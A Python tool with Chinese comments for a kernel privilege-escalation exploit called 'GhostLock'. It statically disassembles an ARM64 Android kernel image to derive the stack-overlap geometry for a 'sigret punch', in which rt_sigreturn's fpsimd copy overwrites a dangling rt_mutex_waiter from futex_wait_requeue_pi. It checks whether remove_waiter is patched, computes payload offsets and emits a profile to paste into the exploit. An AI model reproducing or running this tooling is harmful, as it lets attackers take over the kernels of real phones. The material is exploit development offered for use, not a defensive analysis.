#!/usr/bin/env python3
"""
derive_punch.py — 纯静态推导 GhostLock「sigret punch」几何（本机型链路，非官方三种路线）

为什么需要它
------------
官方 extract_rs 只认三条路线（6.6/6.12 的 select_stack、6.1 的 tcp_zerocopy、5.15 的 multicast），
`grep sigret` 在其源码里零命中。我们在 PHY110 上走通的是第三条自己的路：
    64 位 rt_sigreturn 的 fpsimd 上下文写入（GL_PUNCH=sigret）
它的几何由三个量决定，全部可以从 boot.img 的内核 Image 静态算出来：

    D           = frame(__arm64_sys_rt_sigreturn) − L      （写入起点距 syscall 入口 sp 的深度）
    waiter_depth= Σframes(futex 调用链) − W                （rt_mutex_waiter 距同一基点的深度）
    waiter_off  = D − waiter_depth                          （waiter 在 payload 缓冲里的偏移）
可行性： 0 ≤ waiter_off  且  waiter_off + 0x40 ≤ S_b

其中：
    L   = sigreturn 里 `add xN, sp, #L` 紧跟 `mov w2, #S_b` + `bl __arch_copy_from_user` 的立即数
    S_b = 同一个 `mov w2, #S_b`（fpsimd 上下文拷贝长度，512 或 528）
    W   = futex_wait_requeue_pi 里 rt_mutex_waiter 的栈偏移
          （`add xN, sp, #W` + `mov w2, #sizeof(rt_mutex_waiter)` + `bl memset`，size 来自 BTF）
    Σframes = 调用链上各函数的栈帧之和。注意：LTO 可能把 do_futex 内联进 __arm64_sys_futex，
          此时链是 __arm64_sys_futex → futex_wait_requeue_pi（中间少一层），本工具按实际 bl 边判定。

用法
----
    python derive_punch.py Image symbols.json [--json] [--profile]

退出码
------
    0 = 可推导且几何可行        2 = 可推导但几何不可行
    3 = 符号/指令模式缺失（新内核形态需要人工看）   6 = remove_waiter 已打补丁（Exploit 不成立）
"""
import json
import struct
import sys
import bisect

try:
    import capstone
except ImportError:
    sys.exit("需要 capstone: pip install capstone")

BASE = 0xFFFFFFC008000000
MIN_HEADROOM = 0x40          # 写入必须至少盖过 waiter 头 0x40 字节（rb_node + wake_state 等）


# ----------------------------------------------------------------------------- BTF
def find_btf(data):
    pos = 0
    while True:
        i = data.find(struct.pack("<H", 0xEB9F), pos)
        if i < 0:
            return None
        try:
            magic, version, flags, hdr_len, type_off, type_len, str_off, str_len = \
                struct.unpack_from("<HBBIIIII", data, i)
        except struct.error:
            return None
        if version == 1 and hdr_len >= 24 and type_len > 1000 and str_len > 100 \
                and i + hdr_len + str_off + str_len <= len(data):
            return i, hdr_len, type_off, type_len, str_off, str_len
        pos = i + 1


def btf_structs(data):
    """返回 {结构名: (size, {成员: 字节偏移})}"""
    hit = find_btf(data)
    if not hit:
        return {}
    base, hdr_len, type_off, type_len, str_off, str_len = hit
    strs = data[base + hdr_len + str_off: base + hdr_len + str_off + str_len]

    def s(off):
        e = strs.find(b"\x00", off)
        return strs[off:e].decode("utf-8", "replace") if 0 <= off < len(strs) else ""

    VAR_LEN = {3: 12, 4: 12, 5: 12, 6: 8, 13: 8, 15: 12, 19: 12}
    out = {}
    p = base + hdr_len + type_off
    end = p + type_len
    while p + 12 <= end and p + 12 <= len(data):
        name_off, info, size_or_type = struct.unpack_from("<III", data, p)
        kind = (info >> 24) & 0x1F
        vlen = info & 0xFFFF
        if kind == 4:  # STRUCT
            members = {}
            q = p + 12
            for _ in range(vlen):
                m_name, _m_type, m_off = struct.unpack_from("<III", data, q)
                members[s(m_name)] = (m_off & 0xFFFFFF) >> 3
                q += 12
            out[s(name_off)] = (size_or_type, members)
            p = q
        else:
            p += 12 + VAR_LEN.get(kind, 0) * vlen
    return out


# ----------------------------------------------------------------------------- 反汇编
class Image:
    def __init__(self, path, sym_path):
        self.data = open(path, "rb").read()
        raw = json.load(open(sym_path, encoding="utf-8"))
        self.syms = {k: int(v, 16) for k, v in raw.items()}
        # 基址不写死：16K 页 / VA_BITS=48 的内核 _text 不在 0xffffffc008000000
        self.base = self.syms.get("_text") or min(self.syms.values())
        self.items = sorted((v, k) for k, v in self.syms.items())
        self.starts = [a for a, _ in self.items]
        self.md = capstone.Cs(capstone.CS_ARCH_ARM64, capstone.CS_MODE_LITTLE_ENDIAN)

    def owner(self, addr):
        i = bisect.bisect_right(self.starts, addr) - 1
        return self.items[i][1] if i >= 0 else "?"

    def size_of(self, name):
        a = self.syms[name]
        i = self.starts.index(a)
        return self.items[i + 1][0] - a if i + 1 < len(self.items) else 0x1000

    def dis(self, name, cap=None):
        a = self.syms[name]
        n = min(cap or self.size_of(name), self.size_of(name))
        return list(self.md.disasm(self.data[a - self.base: a - self.base + n], a))

    def frame(self, name):
        """函数自身栈帧：入口处的 pre-index stp/str 与 sub sp 之和"""
        total = 0
        ins = self.dis(name)
        for x in ins[:24]:
            if x.mnemonic in ("stp", "str") and x.op_str.endswith("!") and "[sp, #-0x" in x.op_str:
                total += int(x.op_str.split("#-0x")[1].rstrip("]!"), 16)
            elif x.mnemonic == "sub" and x.op_str.startswith("sp, sp, #0x"):
                total += int(x.op_str.split("#")[1], 16)
            elif x.mnemonic in ("bl", "b", "ret"):
                break
        if total == 0:
            # 兜底：第一条 sub sp 或 pre-index
            for x in ins[:8]:
                if x.mnemonic == "sub" and x.op_str.startswith("sp, sp, #0x"):
                    total = int(x.op_str.split("#")[1], 16)
                    break
        return total

    def calls(self, name):
        """函数里所有 bl 的目标符号名（只保留落在 kallsyms 函数起点的）"""
        out = []
        for x in self.dis(name):
            if x.mnemonic == "bl" and x.op_str.startswith("#"):
                t = int(x.op_str[1:], 16)
                if t in self.syms.values():
                    out.append(self.owner(t))
        return out

    def find_copy_site(self, name, copy_fn):
        """找 `add xN, sp, #L` + `mov w2, #S` + `bl copy_fn`，返回 [(L, S)]"""
        ins = self.dis(name)
        hits = []
        for i, x in enumerate(ins):
            if x.mnemonic != "add" or ", sp, #0x" not in x.op_str:
                continue
            if not x.op_str.startswith("x0,"):
                continue
            off = int(x.op_str.split("#")[1], 16)
            for y in ins[i + 1:i + 4]:
                if y.mnemonic == "mov" and y.op_str.startswith("w2, #0x"):
                    size = int(y.op_str.split("#")[1], 16)
                    for z in ins[i + 1:i + 6]:
                        if z.mnemonic == "bl" and z.op_str.startswith("#") \
                                and self.owner(int(z.op_str[1:], 16)) == copy_fn:
                            hits.append((off, size))
                    break
        return hits

    def find_local_memset(self, name, size):
        """找 `add xN, sp, #W` + `mov w2, #size` + `bl memset`（初始化结构体），返回 W"""
        ins = self.dis(name)
        for i, x in enumerate(ins):
            if x.mnemonic != "add" or ", sp, #0x" not in x.op_str:
                continue
            off = int(x.op_str.split("#")[1], 16)
            window = ins[i + 1:i + 5]
            has_size = any(y.mnemonic == "mov" and y.op_str == f"w2, #{hex(size)}" for y in window)
            has_memset = any(y.mnemonic == "bl" and self.owner(int(y.op_str[1:], 16)) == "memset"
                             for y in window if y.op_str.startswith("#"))
            if has_size and has_memset:
                return off
        return None

    def remove_waiter_patched(self):
        """上游修复把 current 换成 waiter->task ⇒ 不再有 `mrs xN, sp_el0`"""
        if "remove_waiter" not in self.syms:
            return None
        ins = self.dis("remove_waiter")
        has_mrs = any(x.mnemonic == "mrs" and "sp_el0" in x.op_str for x in ins)
        return not has_mrs

    def direct_caller_chain(self, entry, target):
        """在 [entry, target] 之间的实际 bl 边上找最短链（LTO 可能把中间层内联掉）"""
        if target in self.calls(entry):
            return [entry, target]
        for mid in self.calls(entry):
            if mid in self.syms and target in self.calls(mid):
                return [entry, mid, target]
        return None


def main():
    if len(sys.argv) < 3:
        sys.exit(__doc__)
    img_path, sym_path = sys.argv[1], sys.argv[2]
    want_json = "--json" in sys.argv
    want_profile = "--profile" in sys.argv

    img = Image(img_path, sym_path)
    structs = btf_structs(img.data)

    # ---- 0. 漏洞是否还在 ----
    patched = img.remove_waiter_patched()
    if patched:
        print("[!] remove_waiter 已打补丁（不再 mrs sp_el0）⇒ CVE-2026-43499 不可利用")
        sys.exit(6)
    if patched is None:
        print("[!] 警告：符号表里没有 remove_waiter，跳过漏洞检查", file=sys.stderr)

    # ---- 1. rt_mutex_waiter 结构（BTF）----
    waiter_size = waiter_task = waiter_lock = None
    if "rt_mutex_waiter" in structs:
        sz, mem = structs["rt_mutex_waiter"]
        waiter_size = sz
        waiter_task = mem.get("task")
        waiter_lock = mem.get("lock")
    if not waiter_size:
        waiter_size = 0x58
        waiter_task, waiter_lock = 0x30, 0x38
        print("[i] BTF 无 rt_mutex_waiter，用 6.1 默认值 0x58/task@0x30/lock@0x38", file=sys.stderr)

    # ---- 2. sigreturn 写入点 ----
    sites = img.find_copy_site("__arm64_sys_rt_sigreturn", "__arch_copy_from_user")
    if not sites:
        print("[!] sigreturn 里没找到 copy_from_user 站点（内核形态变了，需要人工看）")
        sys.exit(3)
    # fpsimd 上下文是 ABI 固定长度：vregs 0x200（清掉 fpsr/fpcr 后我们按 0x200 用），
    # 含 fpsr/fpcr 为 0x210。sigmask/siginfo 等站点更小，按大小筛掉。
    fpsimd = [t for t in sites if t[1] in (0x200, 0x210)]
    if fpsimd:
        off_s, size_s = sorted(fpsimd, key=lambda t: t[1])[0]   # 0x200 优先
    else:
        big = [t for t in sites if t[1] >= 0x100]
        if not big:
            print(f"[!] 只找到小尺寸 copy 站点 {sorted(set(s for _, s in sites))}，"
                  f"没有 fpsimd 上下文拷贝")
            sys.exit(3)
        off_s, size_s = max(big, key=lambda t: t[1])
    frame_sig = img.frame("__arm64_sys_rt_sigreturn")
    D = frame_sig - off_s

    # ---- 3. futex 链与 waiter 偏移 ----
    if "futex_wait_requeue_pi" not in img.syms:
        print("[!] 符号表缺 futex_wait_requeue_pi")
        sys.exit(3)
    W = img.find_local_memset("futex_wait_requeue_pi", waiter_size)
    if W is None:
        print(f"[!] futex_wait_requeue_pi 里没找到 sizeof(rt_mutex_waiter)={waiter_size:#x} 的 memset")
        sys.exit(3)
    chain = img.direct_caller_chain("__arm64_sys_futex", "futex_wait_requeue_pi")
    if not chain:
        print("[!] 找不到 __arm64_sys_futex → futex_wait_requeue_pi 的调用链")
        sys.exit(3)
    frames = {n: img.frame(n) for n in chain}
    waiter_depth = sum(frames.values()) - W

    # ---- 4. 几何 ----
    waiter_off = D - waiter_depth
    ok_lo = waiter_off >= 0
    ok_hi = waiter_off + MIN_HEADROOM <= size_s
    feasible = ok_lo and ok_hi

    result = {
        "release": None,
        "route": "sigret_fpsimd(64-bit rt_sigreturn + __arch_copy_from_user)",
        "copy_fn": "__arch_copy_from_user",
        "container": "__arm64_sys_rt_sigreturn",
        "container_frame": frame_sig,
        "copy_local": off_s,
        "copy_size": size_s,
        "D": D,
        "futex_chain": chain,
        "futex_frames": frames,
        "waiter_local": W,
        "waiter_depth": waiter_depth,
        "waiter_off": waiter_off,
        "headroom_needed": MIN_HEADROOM,
        "feasible": feasible,
        "rt_mutex_waiter": {
            "size": waiter_size, "task": waiter_task, "lock": waiter_lock,
        },
        "remove_waiter_patched": False,
    }

    # release 串（从 Image banner）
    import re
    m = re.search(rb"Linux version ([0-9][^\s]+)", img.data)
    if m:
        result["release"] = m.group(1).decode("latin-1")

    if want_json:
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        print("=" * 74)
        print(" GhostLock sigret-punch 几何推导（纯静态，无需设备）")
        print("=" * 74)
        print(f"  release            : {result['release'] or '?'}")
        print(f"  container          : {chain[0] if chain else '?'}  frame=0x{frame_sig:x}")
        print(f"  copy site          : sp+0x{off_s:x}, size=0x{size_s:x}  ({'__arch_copy_from_user'})")
        print(f"  D (写入起点深度)    : 0x{D:x}   = frame(0x{frame_sig:x}) − 0x{off_s:x}")
        print(f"  futex chain        : {' → '.join(f'{n}(0x{frames[n]:x})' for n in chain)}")
        print(f"  waiter local       : sp+0x{W:x}   (memset {waiter_size:#x})")
        print(f"  waiter_depth       : 0x{waiter_depth:x}   = Σframes(0x{sum(frames.values()):x}) − 0x{W:x}")
        print(f"  → waiter_off       : 0x{waiter_off:x}   (payload 内 waiter 偏移)")
        print(f"  → buffer_size      : 0x{size_s:x}")
        print(f"  → task_offset      : 0x{waiter_task:x}   lock_offset: 0x{waiter_lock:x}")
        print(f"  可行性             : {'✅ 可行' if feasible else '❌ 不可行'}"
              f"   [0 ≤ {waiter_off:#x}, {waiter_off:#x}+0x40 ≤ {size_s:#x}]")
        if not feasible:
            if not ok_lo:
                print(f"     ✗ 写入起点比 waiter 浅 {(-waiter_off):#x} 字节，盖不到 waiter")
            else:
                print(f"     ✗ 覆盖 waiter 后仅剩 {(size_s - waiter_off):#x} 字节 < 0x40，尾部字段会被截断")
        print("=" * 74)

    if want_profile:
        print(f"""
  # 可粘贴到 GLK1 的 route.multicast_waiter 段（本链路沿用 multicast 容器字段命名）
  route.multicast_waiter {{
      waiter_off   = {waiter_off}
      buffer_size  = {size_s}
      task_offset  = {waiter_task}
      lock_offset  = {waiter_lock}
  }}""")

    sys.exit(0 if feasible else 2)


if __name__ == "__main__":
    main()
